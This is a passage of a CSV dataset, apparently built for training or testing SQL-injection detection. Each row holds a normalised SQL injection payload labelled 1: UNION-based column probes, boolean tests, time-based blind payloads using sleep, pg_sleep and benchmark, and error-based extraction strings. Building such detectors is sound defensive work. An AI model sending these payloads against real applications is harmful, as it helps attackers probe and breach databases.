row_index,payload_norm,label,sqli_type_hint
3870,select ( case when ( 4205 = 9574 ) then 4205 else 1/ ( select 0 ) end ) --,1,
3871,"-3862' ) ) union all select 2495,2495,2495,2495,2495,2495,2495--",1,
3872,"1' ) as pfwt where 8448 = 8448 union all select null,null,null,null,null,null,null,null,null#",1,
3873,1' ) and ( 3020 = 3020 ) *6703 and ( 'rskq' = 'rskq,1,
3874,"-5205' ) ) union all select 8592,8592,8592,8592,8592,8592--",1,
3875,"1"" ) ) and 6510 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) and ( ( ""vjvz"" like ""vjvz",1,
3876,"1 ) ) and 6510 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) and ( ( 5200 = 5200",1,
3877,1' ) ) and 2832 = 4165--,1,
3878,1'+ ( select qpaf where 7859 = 7859 or ( select * from ( select ( sleep ( 5 ) ) ) ydpu ) ) +',1,
3879,"1' ) ) ) and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null ) and ( ( ( 'cenk' = 'cenk",1,
3880,"1' ) and 3824 = benchmark ( 5000000,md5 ( 0x76555642 ) ) and ( 'urxs' = 'urxs",1,
3881,select pg_sleep ( 5 ) and ( ( 'vxxg' = 'vxxg,1,
3882,"-5518 ) as yvqm where 7360 = 7360 union all select 7360,7360#",1,
3883,-3359' order by 1--,1,
3884,"-6618"" ) ) ) order by 1#",1,
3885,"1'+ ( select 'drvv' where 5622 = 5622 and 3580 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",1,
3886,"1"" ) ) and 8594 = ( select 8594 from pg_sleep ( 5 ) ) --",1,
3887,"-3628"" or 1570 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 1570 = 1570 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) )",1,
3888,"-6492' ) union all select 7204,7204--",1,
3889,"1"" ) or 5286 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) and ( ""nnmz"" like ""nnmz",1,
3890,"-1755%' union all select 2615,2615,2615,2615,2615,2615#",1,
3891,"-9659 ) ) ) union all select 8665,8665,8665,8665,8665,8665,8665--",1,
3892,"1', ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 9693 = 9693,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) )",1,
3893,1' where 5060 = 5060,1,
3894,"-7574%"" ) or 5023 = ctxsys.drithsx.sn ( 5023, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 5023 = 5023 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ""%"" = """,1,
3895,"-9347' ) union all select 3884,3884#",1,
3896,"1"" where 5333 = 5333 and char ( 109 ) ||char ( 79 ) ||char ( 70 ) ||char ( 90 ) = regexp_substring ( repeat ( right ( char ( 5012 ) ,0 ) ,5000000000 ) ,null ) --",1,
3897,"-4807' where 3232 = 3232 or make_set ( 6599 = 5179,5179 ) --",1,
3898,1 where 1015 = 1015,1,
3899,"( select like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) )",1,
